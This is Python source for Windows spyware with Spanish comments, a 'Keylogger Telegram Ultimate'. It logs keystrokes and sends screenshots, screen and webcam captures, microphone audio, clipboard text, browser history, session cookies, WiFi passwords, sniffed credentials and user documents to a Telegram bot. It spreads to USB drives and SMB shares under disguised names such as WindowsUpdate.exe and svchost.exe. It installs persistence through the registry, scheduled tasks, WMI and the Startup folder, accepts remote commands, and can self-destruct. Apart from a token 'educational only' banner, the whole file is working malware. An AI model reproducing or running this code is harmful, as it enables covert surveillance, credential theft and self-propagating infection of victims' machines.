            screen_size = pyautogui.size()
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screen_rec_{timestamp}.avi"
            out = cv2.VideoWriter(filename, fourcc, fps, screen_size)
            start_time = time.time()
            frame_count = 0
            while time.time() - start_time < duration:
                img = pyautogui.screenshot()
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                out.write(frame)
                frame_count += 1
                time.sleep(1/fps)
            out.release()
            if os.path.exists(filename) and os.path.getsize(filename) > 0:
                with open(filename, 'rb') as f:
                    url = f"https://api.telegram.org/bot{self.TELEGRAM_TOKEN}/sendVideo"
                    files = {'video': (filename, f)}
                    data = {'chat_id': chat_id, 'caption': f"Grabacion ({duration}s, {frame_count} frames)"}
                    requests.post(url, data=data, files=files, timeout=60)
                os.remove(filename)
            else:
                self.send_to_telegram("Error: No se genero el archivo de video")
        except Exception as e:
            self.send_to_telegram(f"Error en grabacion: {str(e)[:200]}")
            if os.path.exists(filename):
                os.remove(filename)

    def _screen_recording_loop(self):
        while self.running:
            time.sleep(3600)
            self._record_screen(duration=60, fps=5)

    # ===================================================================
    # KEYLOGGING
    # ===================================================================

    def on_press(self, key):
        try:
            self.stats['keys_pressed'] += 1

            if self.ctrl_pressed and hasattr(key, 'char') and key.char == 'c':
                self.key_buffer.append('[CTRL+C]')
            elif self.ctrl_pressed and hasattr(key, 'char') and key.char == 'v':
                self.key_buffer.append('[CTRL+V]')
            elif self.ctrl_pressed and hasattr(key, 'char') and key.char == 'a':
                self.key_buffer.append('[CTRL+A]')
            elif self.alt_pressed and key == keyboard.Key.tab:
                self.key_buffer.append('[ALT+TAB]')
            else:
                if key in (keyboard.Key.shift, keyboard.Key.shift_r):
                    self.shift_pressed = True
                    return
                elif key in (keyboard.Key.ctrl, keyboard.Key.ctrl_r):
                    self.ctrl_pressed = True
                    return
                elif key in (keyboard.Key.alt, keyboard.Key.alt_r):
                    self.alt_pressed = True
                    return

                if hasattr(key, 'char') and key.char is not None:
                    char = key.char
                    if self.shift_pressed and char.isalpha():
                        char = char.upper()
                    self.key_buffer.append(char)
                else:
                    if key == keyboard.Key.space:
                        self.key_buffer.append(' ')
                    elif key == keyboard.Key.enter:
                        self.key_buffer.append('\n')
                    elif key == keyboard.Key.backspace:
                        if self.key_buffer:
                            self.key_buffer.pop()
                        else:
                            self.key_buffer.append('[BS]')
                    else:
                        self.key_buffer.append(f'[{key.name}]')

            if len(self.key_buffer) >= self.SEND_THRESHOLD:
                self.send_log()
                if self.streaming_mode and self.streaming_target:
                    self.send_log()

        except:
            pass

    def on_release(self, key):
        if key in (keyboard.Key.shift, keyboard.Key.shift_r):
            self.shift_pressed = False
        elif key in (keyboard.Key.ctrl, keyboard.Key.ctrl_r):
            self.ctrl_pressed = False
        elif key in (keyboard.Key.alt, keyboard.Key.alt_r):
            self.alt_pressed = False

    def format_log(self):
        if not self.key_buffer:
            return None
        timestamp = datetime.now().strftime("%H:%M:%S")
        body = ''.join(self.key_buffer)
        return f"--- {timestamp} ---\n{body}"

    def send_log(self):
        if not self.key_buffer:
            return
        formatted = self.format_log()
        if formatted:
            self.send_to_telegram(formatted)
        self.key_buffer = []
        self.last_sent = datetime.now()

    # ===================================================================
    # TIMER Y HEARTBEAT
    # ===================================================================

    def timer_loop(self):
        last_heartbeat = time.time()
        while self.running:
            time.sleep(1)
            if self.key_buffer and (datetime.now() - self.last_sent).seconds >= self.SEND_INTERVAL:
                self.send_log()
            if self.HEARTBEAT_INTERVAL > 0 and (time.time() - last_heartbeat) >= self.HEARTBEAT_INTERVAL:
                uptime = datetime.now() - self.stats['start_time']
                horas = uptime.seconds // 3600
                minutos = (uptime.seconds % 3600) // 60
                heartbeat_msg = f"""
HEARTBEAT - Keylogger activo
Equipo: {self.system_info['hostname']}
Activo: {uptime.days}d {horas}h {minutos}m
Teclas: {self.stats['keys_pressed']}
Mensajes: {self.stats['messages_sent']}
"""
                self.send_to_telegram(heartbeat_msg)
                last_heartbeat = time.time()

    # ===================================================================
    # MÓDULOS DE RECOLECCIÓN (silenciosos)
    # ===================================================================

    def _get_active_window_title(self):
        try:
            if WINDOW_TITLE_AVAILABLE:
                return win32gui.GetWindowText(win32gui.GetForegroundWindow())
        except:
            pass
        return "Desconocido"

    def _window_title_loop(self):
        last_title = ""
        last_activity = time.time()
        while self.running:
            time.sleep(1)
            try:
                current_title = self._get_active_window_title()
                if current_title != last_title:
                    self.last_window_title = current_title
                    timestamp = datetime.now().strftime("%H:%M:%S")
                    marker = f"\n[Ventana: {current_title} - {timestamp}]\n"
                    self.key_buffer.append(marker)
                    last_title = current_title
                    last_activity = time.time()
                if time.time() - last_activity > 300:
                    self.key_buffer.append(f"\n[Inactividad: {int((time.time()-last_activity)//60)} min]\n")
                    last_activity = time.time()
            except:
                pass

    def _screenshot_loop(self):
        while self.running:
            time.sleep(SCREENSHOT_INTERVAL)
            if not self.running:
                break
            try:
                if SCREENSHOT_AVAILABLE:
                    screenshot = ImageGrab.grab()
                    img_bytes = io.BytesIO()
                    screenshot.save(img_bytes, format='JPEG', quality=60)
                    img_bytes.seek(0)
                    url = f"https://api.telegram.org/bot{self.TELEGRAM_TOKEN}/sendPhoto"
                    files = {'photo': ('screenshot.jpg', img_bytes)}
                    data = {'chat_id': self.TELEGRAM_CHAT_ID}
                    requests.post(url, data=data, files=files, timeout=15)
            except:
                pass

    def _clipboard_loop(self):
        while self.running:
            time.sleep(CLIPBOARD_INTERVAL)
            if not self.running:
                break
            try:
                if CLIPBOARD_AVAILABLE:
                    win32clipboard.OpenClipboard()
                    try:
                        if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
                            data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
                            text = data.decode('utf-8', errors='ignore') if isinstance(data, bytes) else str(data)
                            if text and text != self.last_clipboard_content:
                                self.last_clipboard_content = text
                                self.send_to_telegram(f"Portapapeles:\n```\n{text[:500]}\n```", parse_mode="Markdown")
                    finally:
                        win32clipboard.CloseClipboard()
            except:
                pass

    def _mic_loop(self):
        while self.running:
            time.sleep(MIC_INTERVAL)
            if not self.running:
                break
            try:
                if MIC_AVAILABLE:
                    audio = pyaudio.PyAudio()
                    stream = audio.open(format=pyaudio.paInt16, channels=1, rate=16000,
                                        input=True, frames_per_buffer=1024)
                    frames = [stream.read(1024) for _ in range(0, int(16000 / 1024 * 5))]
                    stream.stop_stream()
                    stream.close()
                    audio.terminate()
                    wav_bytes = io.BytesIO()
                    wf = wave.open(wav_bytes, 'wb')
                    wf.setnchannels(1)
                    wf.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
                    wf.setframerate(16000)
                    wf.writeframes(b''.join(frames))
                    wf.close()
                    wav_bytes.seek(0)
                    url = f"https://api.telegram.org/bot{self.TELEGRAM_TOKEN}/sendAudio"
                    files = {'audio': ('recording.wav', wav_bytes)}
                    data = {'chat_id': self.TELEGRAM_CHAT_ID}
                    requests.post(url, data=data, files=files, timeout=20)
            except:
                pass

    def _webcam_loop(self):
        while self.running:
            time.sleep(WEBCAM_INTERVAL)
            if not self.running:
                break
            try:
                if WEBCAM_AVAILABLE:
                    cap = cv2.VideoCapture(0)
                    ret, frame = cap.read()
                    if ret:
                        _, img_encoded = cv2.imencode('.jpg', frame)
                        img_bytes = img_encoded.tobytes()
                        url = f"https://api.telegram.org/bot{self.TELEGRAM_TOKEN}/sendPhoto"
                        files = {'photo': ('webcam.jpg', img_bytes)}
                        data = {'chat_id': self.TELEGRAM_CHAT_ID}
                        requests.post(url, data=data, files=files, timeout=15)
                    cap.release()
            except:
                pass

    def _file_exfiltration_loop(self):
        exts = ['.docx', '.pdf', '.xlsx', '.txt', '.jpg', '.png', '.zip', '.rar']
        while self.running:
            time.sleep(86400)
            if not self.running:
                break
            try:
                docs = []
                for root, _, files in os.walk(os.path.expanduser('~')):
                    for file in files:
                        if any(file.endswith(ext) for ext in exts):
                            docs.append(os.path.join(root, file))
                            if len(docs) >= 3:
                                break
                    if len(docs) >= 3:
                        break
                for doc in docs:
                    with open(doc, 'rb') as f:
                        url = f"https://api.telegram.org/bot{self.TELEGRAM_TOKEN}/sendDocument"
                        files = {'document': (os.path.basename(doc), f)}
                        requests.post(url, data={'chat_id': self.TELEGRAM_CHAT_ID}, files=files, timeout=30)
                    time.sleep(1)
                self.stats['files_exfiltrated'] = self.stats.get('files_exfiltrated', 0) + len(docs)
            except:
                pass

    def _browser_history_loop(self):
        while self.running:
            time.sleep(86400)
            if not self.running:
                break
            self._steal_browser_history()

    def _steal_browser_history(self):
        try:
            from browser_history import get_history
            outputs = get_history()
            history = outputs.histories
            if history:
                recent = history[-500:]
                lines = [f"{dt.strftime('%Y-%m-%d %H:%M')} | {url}" for dt, url in recent]
                msg = "Historial (ultimas 500):\n" + "\n".join(lines)
                self._send_long_message(msg)
            else:
                self.send_to_telegram("No se encontró historial")
        except Exception as e:
            self.send_to_telegram(f"Error historial: {str(e)[:200]}")

    def _steal_browser_cookies(self):
        try:
            if not BROWSER_COOKIE_AVAILABLE:
                return
            browsers = [browser_cookie3.chrome, browser_cookie3.firefox, browser_cookie3.edge]
            cookies_data = []
            for browser in browsers:
                try:
                    cj = browser(domain_name='.google.com')
                    for cookie in cj:
                        if 'session' in cookie.name.lower() or 'token' in cookie.name.lower():
                            cookies_data.append(f"{cookie.name}: {cookie.value[:50]}...")
                except:
                    pass
            if cookies_data:
                self.send_to_telegram("Cookies de sesion:\n" + "\n".join(cookies_data[:20]))
        except:
            pass

    def _steal_installed_software(self):
        try:
            paths = [
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
            ]
            apps = []
            for path in paths:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                for i in range(winreg.QueryInfoKey(key)[0]):
                    try:
                        subkey = winreg.EnumKey(key, i)
                        subkey_open = winreg.OpenKey(key, subkey)
                        name = winreg.QueryValueEx(subkey_open, "DisplayName")[0]
                        version = ""
                        try:
                            version = winreg.QueryValueEx(subkey_open, "DisplayVersion")[0]
                        except:
                            pass
                        if name:
                            apps.append(f"{name} - {version}")
                    except:
                        pass
            if apps:
                self._send_long_message("Software instalado:\n" + "\n".join(apps[:100]))
        except:
            pass

    def _steal_wifi_passwords(self):
        try:
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'],
                                           creationflags=subprocess.CREATE_NO_WINDOW).decode('utf-8', errors="ignore")
            profiles = [line.split(':')[1].strip() for line in data.split('\n') if "Perfil de todos los usuarios" in line or "All User Profile" in line]
            wifi_list = []
            for profile in profiles:
                try:
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                                                      creationflags=subprocess.CREATE_NO_WINDOW).decode('utf-8', errors="ignore")
                    password = [line.split(':')[1].strip() for line in results.split('\n') if "Contenido de la clave" in line or "Key Content" in line]
                    wifi_list.append(f"SSID: {profile} | PASSWORD: {password[0] if password else 'SIN CONTRASEÑA'}")
                except:
                    pass
            if wifi_list:
                self._send_long_message("Credenciales WiFi:\n" + "\n".join(wifi_list))
            else:
                self.send_to_telegram("No se encontraron credenciales WiFi")
        except Exception as e:
            self.send_to_telegram(f"Error WiFi: {str(e)[:200]}")

    def _wifi_loop(self):
        while self.running:
            time.sleep(86400)
            if not self.running:
                break
            self._steal_wifi_passwords()

    # ===================================================================
    # SNIFFER DE RED
    # ===================================================================

    def _start_sniffer(self, duration, chat_id):
        if not SNIFFER_AVAILABLE:
            self.send_to_telegram("Scapy no instalado")
            return
        if self.sniffer_running:
            self.send_to_telegram("Sniffer ya activo")
            return
        self.send_to_telegram(f"Capturando trafico {duration}s...")
        self.sniffer_running = True
        self.sniffer_packets = []

        def process_packet(packet):
            if not self.sniffer_running:
                return
            try:
                if packet.haslayer(scapy.Raw) and packet.haslayer(scapy.IP):
                    payload = packet[scapy.Raw].load
                    if b'POST' in payload or b'GET' in payload or b'Authorization' in payload:
                        decoded = payload.decode('utf-8', errors='ignore')
                        if any(k in decoded.lower() for k in ['password', 'passwd', 'pwd', 'user', 'login', 'email', 'token']):
                            src_ip = packet[scapy.IP].src
                            dst_ip = packet[scapy.IP].dst
                            self.sniffer_packets.append(f"{src_ip} -> {dst_ip}:\n{decoded[:500]}")
            except:
                pass

        def sniff_thread():
            try:
                scapy.sniff(prn=process_packet, timeout=duration, store=False)
            except Exception as e:
                self.send_to_telegram(f"Sniffer error: {str(e)[:200]}")
            finally:
                self.sniffer_running = False
                if self.sniffer_packets:
                    result = "Captura finalizada:\n\n" + "\n---\n".join(self.sniffer_packets[:20])
                    self._send_long_message(result)
                else:
                    self.send_to_telegram("No se detectaron credenciales en claro")
                self.sniffer_packets = []

        threading.Thread(target=sniff_thread, daemon=True).start()

    def _stop_sniffer(self, chat_id):
        if self.sniffer_running:
            self.sniffer_running = False
            self.send_to_telegram("Sniffer detenido")
        else:
            self.send_to_telegram("Sniffer inactivo")

    # ===================================================================
    # PROPAGACIÓN USB Y RED
    # ===================================================================

    def _get_removable_drives(self):
        drives = []
        try:
            import string
            from ctypes import windll
            for letter in string.ascii_uppercase:
                path = letter + ":\\"
                if os.path.exists(path):
                    drive_type = windll.kernel32.GetDriveTypeW(path)
                    if drive_type == 2:
                        drives.append(path)
        except:
            pass
        return drives

    def _copy_self_to_usb(self, drive_path):
        try:
            script_path = os.path.abspath(__file__)
            dest_path = os.path.join(drive_path, "WindowsUpdate.exe")
            if not os.path.exists(dest_path):
                shutil.copy2(script_path, dest_path)
                subprocess.run(f'attrib +h +s "{dest_path}"', shell=True,
                               creationflags=subprocess.CREATE_NO_WINDOW)
                shortcut_path = os.path.join(drive_path, "Confidential Documents.lnk")
                self._create_shortcut(shortcut_path, dest_path)
                self.stats['usb_propagated'] += 1
                self.send_to_telegram(f"Propagado a USB: {drive_path}")
        except:
            pass

    def _create_shortcut(self, shortcut_path, target_path):
        try:
            if SHORTCUT_AVAILABLE:
                shell = Dispatch('WScript.Shell')
                shortcut = shell.CreateShortCut(shortcut_path)
                shortcut.TargetPath = target_path
                shortcut.Arguments = "--silent"
                shortcut.WorkingDirectory = os.path.dirname(target_path)
                shortcut.IconLocation = "%SystemRoot%\\system32\\SHELL32.dll, 4"
                shortcut.Save()
            else:
                vbs_script = f'''
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "{shortcut_path}"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "{target_path}"
oLink.Arguments = "--silent"
oLink.WorkingDirectory = "{os.path.dirname(target_path)}"
oLink.IconLocation = "%SystemRoot%\\system32\\SHELL32.dll, 4"
oLink.Save
'''
                vbs_path = os.environ['TEMP'] + "\\temp.vbs"
                with open(vbs_path, 'w') as f:
                    f.write(vbs_script)
                subprocess.run(f'cscript //B "{vbs_path}"', shell=True,
                               creationflags=subprocess.CREATE_NO_WINDOW)
                os.remove(vbs_path)
        except:
            pass

    def _usb_propagation_loop(self):
        known_drives = set(self._get_removable_drives())
        while self.running:
            time.sleep(10)
            if not self.running:
                break
            try:
                current_drives = set(self._get_removable_drives())
                new_drives = current_drives - known_drives
                for drive in new_drives:
                    self._copy_self_to_usb(drive)
                known_drives = current_drives
            except:
                pass

    def _get_local_ip_range(self):
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            return '.'.join(local_ip.split('.')[:-1])
        except:
            return None

    def _scan_network_shares(self, base_ip):
        active = []
        for i in range(1, 255):
            ip = f"{base_ip}.{i}"
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                if sock.connect_ex((ip, 445)) == 0:
                    active.append(ip)
                sock.close()
            except:
                pass
        return active

    def _propagate_to_host(self, host_ip):
        try:
            script_path = os.path.abspath(__file__)
            dest = f"\\\\{host_ip}\\Users\\Public\\svchost.exe"
            if not os.path.exists(dest):
                shutil.copy2(script_path, dest)
                return True
        except:
            pass
        return False

    def _scan_and_propagate_network(self):
        base_ip = self._get_local_ip_range()
        if not base_ip:
            return
        hosts = self._scan_network_shares(base_ip)
        if not hosts:
            return
        success = 0
        for host in hosts[:10]:
            if self._propagate_to_host(host):
                success += 1
        if success:
            self.send_to_telegram(f"Propagado a {success} host(s) en red local")

    def _network_propagation_loop(self):
        while self.running:
            time.sleep(21600)
            if not self.running:
                break
            self._scan_and_propagate_network()

    # ===================================================================
    # AUTO-DESTRUCCIÓN
    # ===================================================================

    def _self_destruct_timer(self):
        end_time = datetime.now() + timedelta(days=self.SELF_DESTRUCT_DAYS)
        while self.running:
            if datetime.now() >= end_time:
                self._self_destruct()
                break
            time.sleep(3600)

    def _self_destruct(self):
        self.send_to_telegram("Auto-destruccion activada")
        self.running = False
        remove_from_startup()
        remove_scheduled_task()
        remove_wmi_persistence()
        try:
            os.remove(sys.argv[0])
        except:
            pass
        try:
            shutil.rmtree(os.path.join(os.environ['APPDATA'], 'Microsoft', 'Telemetry'), ignore_errors=True)
        except:
            pass
        sys.exit(0)

    # ===================================================================
    # COMANDOS REMOTOS (POLLING)
    # ===================================================================

    def _remote_commands_loop(self):
        last_update_id = 0
        while self.running:
            time.sleep(self.command_check_interval)
            try:
                url = f"https://api.telegram.org/bot{self.TELEGRAM_TOKEN}/getUpdates"
                params = {'offset': last_update_id + 1, 'timeout': 5}
                resp = requests.get(url, params=params, timeout=10)
                if resp.status_code == 200:
                    for upd in resp.json().get('result', []):
                        last_update_id = upd['update_id']
                        msg = upd.get('message')
                        cb = upd.get('callback_query')
                        if cb:
                            self._handle_command(cb['data'], cb['message']['chat']['id'], cb['id'])
                        elif msg and msg.get('text'):
                            self._handle_command(msg['text'], msg['chat']['id'])
            except:
                pass

    # ===================================================================
    # UTILIDADES
    # ===================================================================

    def _send_long_message(self, text):
        for i in range(0, len(text), 4000):
            self.send_to_telegram(text[i:i+4000])

    def start(self):
        try:
            with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
                listener.join()
        except:
            pass
        finally:
            self.running = False
            self.send_log()
            self.send_to_telegram("Keylogger detenido")

    def send_startup_message(self):
        msg = f"""
KEYLOGGER ULTIMATE ACTIVADO

Equipo: {self.system_info['hostname']}
Usuario: {self.system_info['user']}
IP Local: {self.system_info['local_ip']}
IP Publica: {self.system_info['public_ip']}
Inicio: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Monitor activo
"""
        self.send_to_telegram(msg)

# ===================================================================
# PERSISTENCIA
# ===================================================================

def add_to_startup():
    try:
        script_path = os.path.abspath(__file__)
        python_dir = os.path.dirname(sys.executable)
        pythonw = os.path.join(python_dir, 'pythonw.exe')
        if not os.path.exists(pythonw):
            pythonw = sys.executable
        run_path = f'"{pythonw}" "{script_path}" --silent'
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "WindowsTelemetryUltimate", 0, winreg.REG_SZ, run_path)
        winreg.CloseKey(key)
        return True
    except:
        return False

def remove_from_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_WRITE)
        winreg.DeleteValue(key, "WindowsTelemetryUltimate")
        winreg.CloseKey(key)
        return True
    except:
        return False

def add_scheduled_task():
    try:
        script_path = os.path.abspath(__file__)
        pythonw = os.path.join(os.path.dirname(sys.executable), 'pythonw.exe')
        cmd = f'schtasks /create /tn "WindowsTelemetryUltimate" /tr "{pythonw} \\"{script_path}\\" --silent" /sc onlogon /rl highest /f'
        subprocess.run(cmd, shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except:
        return False

def remove_scheduled_task():
    try:
        subprocess.run('schtasks /delete /tn "WindowsTelemetryUltimate" /f', shell=True,
                       capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except:
        return False

def add_wmi_persistence():
    if not WMI_AVAILABLE:
        return False
    try:
        import wmi
        c = wmi.WMI()
        script_path = os.path.abspath(__file__)
        pythonw = os.path.join(os.path.dirname(sys.executable), 'pythonw.exe')
        wql = f"SELECT * FROM Win32_Process WHERE Name = '{os.path.basename(script_path)}'"
        if not c.query(wql):
            c.Win32_Process.Create(CommandLine=f'"{pythonw}" "{script_path}" --silent')
        return True
    except:
        return False

def remove_wmi_persistence():
    if not WMI_AVAILABLE:
        return False
    try:
        import wmi
        c = wmi.WMI()
        script_name = os.path.basename(__file__)
        for proc in c.Win32_Process(Name=script_name):
            proc.Terminate()
        return True
    except:
        return False

def add_startup_folder():
    try:
        startup = os.path.join(os.environ['APPDATA'],
                               'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        dest = os.path.join(startup, 'SystemHelper.lnk')
        if not os.path.exists(dest):
            script_path = os.path.abspath(__file__)
            pythonw = os.path.join(os.path.dirname(sys.executable), 'pythonw.exe')
            if os.path.exists(pythonw):
                target = pythonw
                args = f'"{script_path}" --silent'
            else:
                target = sys.executable
                args = f'"{script_path}" --silent'
            if SHORTCUT_AVAILABLE:
                shell = Dispatch('WScript.Shell')
                shortcut = shell.CreateShortCut(dest)
                shortcut.TargetPath = target
                shortcut.Arguments = args
                shortcut.WorkingDirectory = os.path.dirname(script_path)
                shortcut.IconLocation = target
                shortcut.Save()
            else:
                vbs = f'''
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "{dest}"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "{target}"
oLink.Arguments = "{args}"
oLink.WorkingDirectory = "{os.path.dirname(script_path)}"
oLink.Save
'''
                vbs_path = os.environ['TEMP'] + "\\link.vbs"
                with open(vbs_path, 'w') as f:
                    f.write(vbs)
                subprocess.run(f'cscript //B "{vbs_path}"', shell=True,
                               creationflags=subprocess.CREATE_NO_WINDOW)
                os.remove(vbs_path)
            return True
    except:
        return False
    return False

def add_boot_registry():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_WRITE)
        script_path = os.path.abspath(__file__)
        pythonw = os.path.join(os.path.dirname(sys.executable), 'pythonw.exe')
        if not os.path.exists(pythonw):
            pythonw = sys.executable
        winreg.SetValueEx(key, "WindowsTelemetryUltimate", 0, winreg.REG_SZ,
                         f'"{pythonw}" "{script_path}" --silent')
        winreg.CloseKey(key)
        return True
    except:
        return False

def add_full_persistence():
    add_to_startup()
    add_scheduled_task()
    add_wmi_persistence()
    add_startup_folder()
    add_boot_registry()
    create_hidden_storage()

def create_hidden_storage():
    try:
        appdata = os.environ.get('APPDATA', 'C:\\')
        hidden_dir = os.path.join(appdata, "Microsoft", "Telemetry")
        os.makedirs(hidden_dir, exist_ok=True)
        subprocess.run(f'attrib +h +s "{hidden_dir}"', shell=True,
                       creationflags=subprocess.CREATE_NO_WINDOW)
        return hidden_dir
    except:
        return None

def remove_all_persistence():
    remove_from_startup()
    remove_scheduled_task()
    remove_wmi_persistence()
    startup = os.path.join(os.environ['APPDATA'],
                           'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    for f in os.listdir(startup):
        if 'SystemHelper' in f or 'WindowsTelemetry' in f:
            try:
                os.remove(os.path.join(startup, f))
            except:
                pass
    try:
        shutil.rmtree(os.path.join(os.environ['APPDATA'], 'Microsoft', 'Telemetry'), ignore_errors=True)
    except:
        pass

# ===================================================================
# BLOQUE PRINCIPAL
# ===================================================================

if __name__ == "__main__":
    if "--install" in sys.argv:
        add_full_persistence()
        print("✅ Persistencia instalada")
        sys.exit(0)

    if "--uninstall" in sys.argv:
        remove_all_persistence()
        try:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                         data={"chat_id": CHAT_ID, "text": "🗑️ Keylogger desinstalado del sistema"})
        except:
            pass
        print("✅ Desinstalado")
        sys.exit(0)

    if "--silent" in sys.argv:
        k = UltimateKeylogger()
        k.start()
    else:
        print("=" * 60)
        print("🕵️‍♂️ KEYLOGGER TELEGRAM ULTIMATE")
        print("=" * 60)
        print("\n⚠️  ADVERTENCIA: SOLO PARA FINES EDUCATIVOS")
        print("    Usar únicamente en sistemas propios")
        print("=" * 60)
        print("\nOpciones:")
        print("  --install   : Instalar persistencia (inicio automático)")
        print("  --uninstall : Eliminar persistencia")
        print("  --silent    : Ejecutar en segundo plano")
        print()
        input("Presiona Enter para salir...")
